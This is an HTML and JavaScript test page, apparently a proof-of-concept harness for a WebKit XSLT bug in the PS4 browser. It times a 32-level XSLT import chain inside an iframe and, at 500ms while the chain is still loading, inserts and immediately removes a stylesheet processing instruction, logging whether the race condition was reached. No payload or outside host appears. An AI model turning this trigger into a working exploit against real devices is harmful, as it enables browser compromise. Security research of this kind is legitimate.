<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">

<title>PS4 WebKit XSLT V3 - Import Chain Timing</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #111;
    color: #ddd;
    margin: 20px;
}

h2 {
    margin-bottom: 10px;
}

#status {
    border: 1px solid #777;
    padding: 10px;
    margin-bottom: 15px;
    font-family: monospace;
}

#log {
    background: #000;
    border: 1px solid #777;
    padding: 12px;
    white-space: pre-wrap;
    font-family: monospace;
    min-height: 330px;
}

iframe {
    width: 100%;
    height: 150px;
    margin-top: 15px;
    border: 1px solid #777;
}
</style>
</head>

<body>

<h2>PS4 WebKit XSLT V3</h2>

<div id="status">
    32-level XSLT import chain
</div>

<div id="log"></div>

<iframe id="f" src="resources/target.xml"></iframe>

<script>

(function () {

    var start = Date.now();

    var logBox = document.getElementById("log");
    var frame = document.getElementById("f");

    var iframeLoaded = false;
    var triggerExecuted = false;

    function elapsed() {
        return Date.now() - start;
    }

    function log(message) {
        logBox.textContent +=
            "[" + elapsed() + "ms] " + message + "\n";
    }

    /*
     * Record the exact moment when the XML navigation
     * finishes.
     */
    frame.onload = function () {

        iframeLoaded = true;

        log("================================");
        log("IFRAME LOAD EVENT");
        log("XML/XSLT navigation completed.");
        log("Total load time: " + elapsed() + "ms");

        if (elapsed() <= 500) {
            log("RESULT: chain completed before 500ms.");
        } else {
            log("RESULT: chain completed AFTER 500ms.");
            log("This is the timing condition we are looking for.");
        }

        log("================================");
    };

    log("Test started.");

    log("Loading target.xml");

    log("XSLT chain:");

    log("target.xml");
    log("  -> root.xsl");

    for (var i = 1; i <= 32; i++) {

        var n = (i < 10 ? "0" + i : String(i));

        log("      -> child-" + n + ".xsl");
    }

    log("");
    log("Waiting for the 500ms trigger...");

    /*
     * 500ms trigger.
     *
     * We intentionally do NOT replace the stylesheet.
     *
     * We only perform the same ProcessingInstruction
     * insertion/removal operation used in the original
     * LayoutTest.
     */

    setTimeout(function () {

        triggerExecuted = true;

        log("");
        log("========== 500ms TRIGGER ==========");

        try {

            var doc = frame.contentDocument;

            if (!doc) {

                log("contentDocument is NULL.");
                log("Unable to perform trigger.");

                return;
            }

            log("contentDocument obtained.");

            /*
             * Create embedded stylesheet PI.
             */

            var pi = doc.createProcessingInstruction(
                "xml-stylesheet",
                'type="text/xsl" href="#x"'
            );

            log("ProcessingInstruction created.");

            /*
             * Insert it at the beginning of the XML document.
             */

            doc.insertBefore(pi, doc.firstChild);

            log("ProcessingInstruction inserted.");

            /*
             * Immediately remove it.
             */

            pi.parentNode.removeChild(pi);

            log("ProcessingInstruction removed.");

            log("500ms trigger completed.");

            /*
             * Critical diagnostic.
             */

            if (iframeLoaded) {

                log("IMPORTANT:");
                log("iframe had ALREADY loaded before trigger.");

                log("The XSLT chain was therefore not loading");
                log("at the moment of the mutation.");

            } else {

                log("IMPORTANT:");
                log("iframe is STILL loading at 500ms.");

                log("This is the desired timing condition.");
            }

        } catch (e) {

            log("Exception during 500ms trigger:");
            log(String(e));
        }

        log("===================================");

    }, 500);

    /*
     * 750ms diagnostic.
     */

    setTimeout(function () {

        log("");
        log("750ms checkpoint.");

        if (iframeLoaded)
            log("iframe: LOADED");
        else
            log("iframe: STILL LOADING");

    }, 750);

    /*
     * 1000ms diagnostic.
     */

    setTimeout(function () {

        log("");
        log("1000ms checkpoint.");

        if (iframeLoaded)
            log("iframe: LOADED");
        else
            log("iframe: STILL LOADING");

    }, 1000);

    /*
     * 2000ms diagnostic.
     */

    setTimeout(function () {

        log("");
        log("2000ms checkpoint.");

        if (iframeLoaded)
            log("iframe: LOADED");
        else
            log("iframe: STILL LOADING");

    }, 2000);

    /*
     * Final observation.
     */

    setTimeout(function () {

        log("");
        log("================================");
        log("3500ms TEST COMPLETE");

        if (iframeLoaded) {

            log("Browser still running.");

            log("Final iframe state: LOADED");

        } else {

            log("Browser still running.");

            log("Final iframe state: STILL LOADING");
        }

        log("================================");

    }, 3500);

})();

</script>

</body>
</html>
